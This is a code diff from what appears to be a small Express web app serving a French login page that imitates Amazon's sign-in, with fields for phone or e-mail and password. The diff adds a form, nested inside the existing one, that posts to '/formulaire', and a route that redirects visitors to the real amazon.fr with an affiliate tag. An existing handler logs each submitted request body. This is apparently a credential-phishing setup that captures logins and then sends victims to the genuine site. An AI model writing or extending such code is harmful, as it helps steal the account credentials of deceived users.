@@ -248,7 +248,9 @@ padding: 0 10px;
         <input name="username" placeholder="Téléphone ou adresse e-mail" required />
         <input type="password" name="password" placeholder="Mot de passe" required />
 
-        <button type="submit">Continuer</button>
+        <form method="POST" action="/formulaire">
+          <button type="submit">Continuer</button>
+        </form>
       </form>
 
       <div class="footer">
@@ -294,6 +296,10 @@ padding: 0 10px;
 });
 
 // RECEIVE
+app.post("/formulaire", (req, res) => {
+  res.redirect("https://www.amazon.fr/?&tag=hydraamazon05-21&ref=pd_sl_781ozcfkw9_e&adgrpid=154637622122&hvpone=&hvptwo=&hvadid=683560492550&hvpos=&hvnetw=g&hvrand=3185657194183930010&hvqmt=e&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=9056101&hvtargid=kwd-10573980&hydadcr=");
+});
+
 app.post("/send", (req, res) => {
 
 console.log("BODY:", req.body);
